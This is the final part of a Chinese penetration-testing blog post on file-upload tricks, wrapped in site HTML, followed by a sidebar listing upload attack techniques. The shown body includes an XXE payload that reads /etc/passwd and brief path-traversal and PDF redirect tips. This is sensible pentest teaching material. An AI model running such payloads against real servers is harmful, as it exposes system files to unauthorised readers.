+<h3 id="JSON数据包可以改成xml格式测试xxe漏洞"><a href="#JSON数据包可以改成xml格式测试xxe漏洞" class="headerlink" title="JSON数据包可以改成xml格式测试xxe漏洞"></a>JSON数据包可以改成xml格式测试xxe漏洞</h3><p>将<code>application/json</code>改成<code>application/xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="php"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span><span class="meta">?&gt;</span></span></div><div class="line"><span class="meta">&lt;!DOCTYPE root [&lt;!ENTITY  file SYSTEM "file:///etc/passwd"&gt;]&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span>&amp;file;<span class="tag">&lt;/<span class="name">root</span>&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="上传PDF文件进行URL跳转"><a href="#上传PDF文件进行URL跳转" class="headerlink" title="上传PDF文件进行URL跳转"></a>上传PDF文件进行URL跳转</h3><p>PDF-&gt;页面属性-&gt;动作-&gt;打开网络链接-&gt;添加</p>
+<h3 id="上传目录可控，进行文件覆盖"><a href="#上传目录可控，进行文件覆盖" class="headerlink" title="上传目录可控，进行文件覆盖"></a>上传目录可控，进行文件覆盖</h3><h3 id="使用-进行目录切换"><a href="#使用-进行目录切换" class="headerlink" title="使用../进行目录切换"></a>使用<code>../</code>进行目录切换</h3><blockquote>
+<p>如有错误或不足，欢迎大佬不吝指正、补充。</p>
+</blockquote>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+    <div>大爷，赏个铜板呗！</div>
+    <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById('QR'); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+      <span>赏</span>
+    </button>
+    <div id="QR" style="display: none;">
+      
+        <div id="wechat" style="display: inline-block">
+          <img id="wechat_qr" src="/images/weixin.png" alt="瓦都剋 WeChat Pay"/>
+          <p>微信打赏</p>
+        </div>
+      
+      
+        <div id="alipay" style="display: inline-block">
+          <img id="alipay_qr" src="/images/zhifubao.png" alt="瓦都剋 Alipay"/>
+          <p>支付宝打赏</p>
+        </div>
+      
+    </div>
+  </div>
+
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      瓦都剋
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="http://byd.dropsec.xyz/2019/05/18/渗透测试中文件上传技巧/" title="渗透测试中文件上传技巧">http://byd.dropsec.xyz/2019/05/18/渗透测试中文件上传技巧/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/渗透测试/" rel="tag"><i class="fa fa-tag"></i> 渗透测试</a>
+          
+            <a href="/tags/文件上传/" rel="tag"><i class="fa fa-tag"></i> 文件上传</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/03/27/Linux、Windows权限维持常用后门总结2/" rel="next" title="Linux、Windows权限维持常用后门学习总结:windows篇">
+                <i class="fa fa-chevron-left"></i> Linux、Windows权限维持常用后门学习总结:windows篇
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+        <!-- JiaThis Button BEGIN -->
+<div class="jiathis_style">
+  <a class="jiathis_button_tsina"></a>
+  <a class="jiathis_button_tqq"></a>
+  <a class="jiathis_button_weixin"></a>
+  <a class="jiathis_button_cqq"></a>
+  <a class="jiathis_button_douban"></a>
+  <a class="jiathis_button_renren"></a>
+  <a class="jiathis_button_qzone"></a>
+  <a class="jiathis_button_kaixin001"></a>
+  <a class="jiathis_button_copy"></a>
+  <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
+  <a class="jiathis_counter_style"></a>
+</div>
+<script type="text/javascript" >
+  var jiathis_config={
+    hideMore:false
+  }
+</script>
+<script type="text/javascript" src="http://v3.jiathis.com/code/jia.js" charset="utf-8"></script>
+<!-- JiaThis Button END -->
+
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="瓦都剋" />
+          <p class="site-author-name" itemprop="name">瓦都剋</p>
+           
+              <p class="site-description motion-element" itemprop="description">Looking at yourself from a different Angle!</p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">90</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">79</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate">
+              <i class="fa fa-rss"></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="http://weibo.com/w2n1ck" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://github.com/w2n1ck" target="_blank" title="Github">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Github
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.zhihu.com/people/w2n1ck/activities" target="_blank" title="Zhihu">
+                  
+                    <i class="fa fa-fw fa-heartbeat"></i>
+                  
+                  Zhihu
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://wkh.dropsec.xyz" title="王小洪" target="_blank">王小洪</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://fgp.dropsec.xyz" title="冯小鹏" target="_blank">冯小鹏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://blog.neargle.com/" title="周小斌" target="_blank">周小斌</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://am4zing.me/" title="王小岩" target="_blank">王小岩</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://yangge.me/" title="杨大成" target="_blank">杨大成</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://www.secpulse.com/" title="安全脉搏" target="_blank">安全脉搏</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.dropsec.xyz/" title="团队主页" target="_blank">团队主页</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#上传文件名fuzz字典"><span class="nav-number">1.</span> <span class="nav-text">上传文件名fuzz字典</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传excel文档进行CSV注入"><span class="nav-number">2.</span> <span class="nav-text">上传excel文档进行CSV注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传excel、word进行xxe"><span class="nav-number">3.</span> <span class="nav-text">上传excel、word进行xxe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传mp4-avi利用ffmpeg文件读取-SSRF"><span class="nav-number">4.</span> <span class="nav-text">上传mp4/avi利用ffmpeg文件读取/SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传imagemagic文件进行命令执行"><span class="nav-number">5.</span> <span class="nav-text">上传imagemagic文件进行命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传Ghostscript文件进行命令执行"><span class="nav-number">6.</span> <span class="nav-text">上传Ghostscript文件进行命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传svg文件进行ssrf"><span class="nav-number">7.</span> <span class="nav-text">上传svg文件进行ssrf</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传svg文件进行xss"><span class="nav-number">8.</span> <span class="nav-text">上传svg文件进行xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传webp后缀进行文件进行xss"><span class="nav-number">9.</span> <span class="nav-text">上传webp后缀进行文件进行xss</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传shtml进行SSI"><span class="nav-number">10.</span> <span class="nav-text">上传shtml进行SSI</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传html，phtml等进行XSS"><span class="nav-number">11.</span> <span class="nav-text">上传html，phtml等进行XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对上传文件进行导出excel的地方插入payload进行csv注入"><span class="nav-number">12.</span> <span class="nav-text">对上传文件进行导出excel的地方插入payload进行csv注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF"><span class="nav-number">13.</span> <span class="nav-text">上传文件时如果转换时比如转成PDF等文件，尝试在上传文件中加入payload进行SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#文件上传时，修改正在上传中的-input-type-为URL，尝试SSRF"><span class="nav-number">14.</span> <span class="nav-text">文件上传时，修改正在上传中的 input type 为URL，尝试SSRF</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传文件名XSS"><span class="nav-number">15.</span> <span class="nav-text">上传文件名XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传图片里面注入Code"><span class="nav-number">16.</span> <span class="nav-text">上传图片里面注入Code</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#图片属性XSS"><span class="nav-number">17.</span> <span class="nav-text">图片属性XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传文件名SQL注入"><span class="nav-number">18.</span> <span class="nav-text">上传文件名SQL注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS-7-0-IIS-7-5-Nginx-lt-8-03畸形解析漏洞"><span class="nav-number">19.</span> <span class="nav-text">IIS 7.0/IIS 7.5/ Nginx <8.03畸形解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Apache解析漏洞"><span class="nav-number">20.</span> <span class="nav-text">Apache解析漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows系统特性"><span class="nav-number">21.</span> <span class="nav-text">Windows系统特性</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传-htaccess文件"><span class="nav-number">22.</span> <span class="nav-text">上传.htaccess文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Windows下利用ADS流上传文件"><span class="nav-number">23.</span> <span class="nav-text">Windows下利用ADS流上传文件</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IIS6截断"><span class="nav-number">24.</span> <span class="nav-text">IIS6截断</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#双文件上传"><span class="nav-number">25.</span> <span class="nav-text">双文件上传</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSON利用"><span class="nav-number">26.</span> <span class="nav-text">JSON利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#JSON数据包可以改成xml格式测试xxe漏洞"><span class="nav-number">27.</span> <span class="nav-text">JSON数据包可以改成xml格式测试xxe漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传PDF文件进行URL跳转"><span class="nav-number">28.</span> <span class="nav-text">上传PDF文件进行URL跳转</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#上传目录可控，进行文件覆盖"><span class="nav-number">29.</span> <span class="nav-text">上传目录可控，进行文件覆盖</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#使用-进行目录切换"><span class="nav-number">30.</span> <span class="nav-text">使用../进行目录切换</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2015 - 
+  <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-linkedin"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">瓦都剋</span>
+</div>
+
+
+
+        
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.1"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://mydisqus-2.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'http://byd.dropsec.xyz/2019/05/18/渗透测试中文件上传技巧/';
+          this.page.identifier = '2019/05/18/渗透测试中文件上传技巧/';
+          this.page.title = '渗透测试中文件上传技巧';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://mydisqus-2.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (search_path.endsWith("json")) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Config({
+        tex2jax: {
+          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+          processEscapes: true,
+          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+      });
+    </script>
+
+    <script type="text/x-mathjax-config">
+      MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+          all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+      });
+    </script>
+    <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+  
+
+
+  
+
+  
+
+<script type="text/javascript" color="0,0,0" opacity='0.7' zIndex="-2" count="20" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
